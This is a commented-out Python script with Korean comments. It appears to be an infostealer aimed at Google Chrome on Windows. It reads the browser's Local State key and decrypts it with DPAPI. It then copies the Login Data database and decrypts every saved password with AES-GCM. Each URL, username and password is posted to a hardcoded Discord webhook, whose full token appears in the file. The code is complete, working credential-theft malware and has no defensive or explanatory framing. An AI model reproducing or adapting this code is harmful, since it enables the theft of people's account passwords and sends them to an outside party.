# import subprocess
# import sys

# package_name = "pycryptodome"
# try:
#     subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
#     print(f"'{package_name}' 패키지가 성공적으로 설치되었습니다.")
# except subprocess.CalledProcessError as e:
#     print(f"패키지 설치 실패: {e}")

# import os
# import sqlite3
# import json
# import base64
# import ctypes
# import ctypes.wintypes
# from Crypto.Cipher import AES
# from shutil import copy2
# import requests
# import time



# def send_to_discord(content):
#     try:
#         webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO"
#         headers = {
#             "Content-Type": "application/json"
#         }

#         for i in content.split("\n"):
#             time.sleep(1)
#             data = {
#                 "content": i
#             }
#             r = requests.post(webhook_url, json=data, headers=headers)
#     except Exception as e:
#         webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO"

#         headers = {
#             "Content-Type": "application/json"
#         }
#         data = {
#             "content": "SEND Error!\n" + str(e)
#         }
#         r = requests.post(webhook_url, json=data, headers=headers)


# class DATA_BLOB(ctypes.Structure):
#     _fields_ = [("cbData", ctypes.wintypes.DWORD),
#                 ("pbData", ctypes.POINTER(ctypes.c_byte))]


# def decrypt_windows_data_protected(encrypted_data):
#     encrypted_blob = DATA_BLOB()
#     encrypted_blob.cbData = len(encrypted_data)
#     encrypted_blob.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data, len(encrypted_data)),
#                                         ctypes.POINTER(ctypes.c_byte))

#     decrypted_blob = DATA_BLOB()

#     if ctypes.windll.crypt32.CryptUnprotectData(
#             ctypes.byref(encrypted_blob),
#             None,  # 설명 (사용되지 않음)
#             None,  # 추가 엔트로피 (옵션)
#             None,  # 예제된부분 (사용되지 않음)
#             None,  # 프론프트 구조체 (사용되지 않음)
#             0,  # 플래그 (0으로 설정)
#             ctypes.byref(decrypted_blob)  # 보환화된 데이터를 저장할 Blob
#     ):
#         decrypted_data = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
#         ctypes.windll.kernel32.LocalFree(decrypted_blob.pbData)
#         return decrypted_data
#     else:
#         raise Exception("Decryption failed: DPAPI could not decrypt the data.")


# def decrypt_aes(encrypted_data, key):
#     try:

#         nonce = encrypted_data[3:15]
#         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
#         decrypted_data = cipher.decrypt_and_verify(encrypted_data[15:-16], encrypted_data[-16:])
#         return decrypted_data.decode('utf-8', errors='ignore')
#     except Exception as e:
#         return f"Failed to decrypt with AES: {str(e)}"



# chrome_login_data_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")


# local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
# with open(local_state_path, "r", encoding="utf-8") as file:
#     local_state = json.load(file)
#     encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
#     encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # 'DPAPI' 헤더를 제거
#     aes_key = decrypt_windows_data_protected(encrypted_key)


# temp_db_path = os.path.join(os.getenv("LOCALAPPDATA"), "temp_login_data.db")
# copy2(chrome_login_data_path, temp_db_path)


# connection = sqlite3.connect(temp_db_path)
# cursor = connection.cursor()


# cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
# login_data = cursor.fetchall()


# for origin_url, username, encrypted_password in login_data:
#     if encrypted_password:
#         if encrypted_password[:3] == b'v10':  # 크롬의 암호화 버전 확인
#             decrypted_password = decrypt_aes(encrypted_password, aes_key)
#         else:
#             try:
#                 decrypted_password = decrypt_windows_data_protected(encrypted_password)
#             except Exception as e:
#                 decrypted_password = f"Failed to decrypt password: {str(e)}"

#         #print(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")
#         send_to_discord("URL : {}\nUsername: {}\nPassword: {}\n\n".format(origin_url, username, decrypted_password))


# cursor.close()
# connection.close()
# os.remove(temp_db_path)
